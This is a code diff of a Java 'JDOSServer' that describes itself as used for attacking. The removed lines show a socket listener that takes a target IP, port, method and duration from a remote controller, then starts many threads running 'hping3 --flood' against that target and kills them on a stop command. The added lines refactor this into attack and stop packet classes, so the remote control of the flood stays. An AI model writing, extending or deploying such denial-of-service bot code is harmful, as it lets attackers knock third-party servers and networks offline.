@@ -5,13 +5,22 @@ import java.io.IOException;
 import java.net.ServerSocket;
 import java.net.Socket;
 
+import com.jdos.packet.Packet;
+import com.jdos.packet.impl.AttackPacket;
+import com.jdos.packet.impl.StopPacket;
+
 /**
  * A JDOSServer used for attacking.
  * 
  * @author Desmond Jackson
  */
 public class JDOSServer extends Object {
-	
+
+	/**
+	 * The packets.
+	 */
+	private static final Packet[] PACKETS = new Packet[] {new AttackPacket(), new StopPacket()};
+
 	/**
 	 * The main method.
 	 * 
@@ -29,65 +38,17 @@ public class JDOSServer extends Object {
 				public void run() {
 					try {
 						DataInputStream din = new DataInputStream(s.getInputStream());
-						if (din.readInt() == 0) {
-							String ip = din.readUTF();
-							String port = din.readUTF();
-							String method = din.readUTF();
-							final int time = new Integer(din.readUTF()) * 1000;
-							din.readInt();
-							din.close();
-							s.close();
-							final String[] command = new String[] {
-									"hping3",
-									ip,
-									"-p",
-									"" + port,
-									"--" + method,
-									"-d",
-									"120",
-									"-w",
-									"64",
-									"--flood",
-									
-							};
-							int threads = Runtime.getRuntime().availableProcessors() * 4;
-							for (int i = 0; i < threads; i++)
-								new Thread(new Runnable() {
-
-									@Override
-									public void run() {
-										try {
-											Process process = Runtime.getRuntime().exec(command);
-											Thread.sleep(time);
-											process.destroy();
-											process.waitFor();
-										} catch (IOException e) {
-											e.printStackTrace();
-										} catch (InterruptedException e) {
-											e.printStackTrace();
-										}
-									}
-									
-								}).start();
-						} else {
-							din.readInt();
-							din.close();
-							s.close();
-							String[] command = new String[] {
-									"killall",
-									"-9",
-									"hping3"
-							};
-							Process process = Runtime.getRuntime().exec(command);
-							process.waitFor();
-						}
+						int id = din.readInt();
+						for (Packet packet : PACKETS)
+							if (packet.getId() == id)
+								packet.execute(din);
+						din.close();
+						s.close();
 					} catch (IOException e) {
-						e.printStackTrace();
-					} catch (InterruptedException e) {
 						e.printStackTrace();
 					}
 				}
-				
+
 			}).start();
 		}
 	}
